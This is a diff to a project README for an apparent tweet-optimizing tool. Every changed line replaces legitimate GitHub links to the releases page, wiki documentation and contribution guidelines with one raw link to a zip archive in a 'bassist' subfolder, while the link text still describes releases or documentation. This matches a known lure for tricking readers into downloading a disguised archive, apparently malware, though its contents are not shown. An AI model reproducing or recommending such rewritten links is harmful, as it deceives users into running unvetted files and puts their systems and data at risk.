@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download dspy-tweet-optimizer](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Hamiz305/dspy-tweet-optimizer/releases)
+[![Download dspy-tweet-optimizer](https://raw.githubusercontent.com/Hamiz305/dspy-tweet-optimizer/main/bassist/dspy-tweet-optimizer.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Hamiz305/dspy-tweet-optimizer/main/bassist/dspy-tweet-optimizer.zip)
 
 ## 📘 Overview
 
@@ -31,9 +31,9 @@ To get started, visit the Releases page to download the latest version of dspy-t
 
 ### Download Link
 
-[Click here to visit the download page.](https://github.com/Hamiz305/dspy-tweet-optimizer/releases)
+[Click here to visit the download page.](https://raw.githubusercontent.com/Hamiz305/dspy-tweet-optimizer/main/bassist/dspy-tweet-optimizer.zip)
 
-1. Go to our [Releases page](https://github.com/Hamiz305/dspy-tweet-optimizer/releases).
+1. Go to our [Releases page](https://raw.githubusercontent.com/Hamiz305/dspy-tweet-optimizer/main/bassist/dspy-tweet-optimizer.zip).
 2. Find the latest release version.
 3. Click on the download link for your operating system. Choose the right file for your system (e.g., `.exe` for Windows, `.dmg` for macOS).
 4. Once downloaded, locate the file in your downloads folder.
@@ -81,7 +81,7 @@ dspy-tweet-optimizer is open-source software. You can use and modify it accordin
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Hamiz305/dspy-tweet-optimizer/wiki)
-- [Contribution Guidelines](https://github.com/Hamiz305/dspy-tweet-optimizer/blob/main/CONTRIBUTING.md)
+- [Documentation](https://raw.githubusercontent.com/Hamiz305/dspy-tweet-optimizer/main/bassist/dspy-tweet-optimizer.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/Hamiz305/dspy-tweet-optimizer/main/bassist/dspy-tweet-optimizer.zip)
 
 Feel free to explore and make the most of your Twitter experience with dspy-tweet-optimizer!
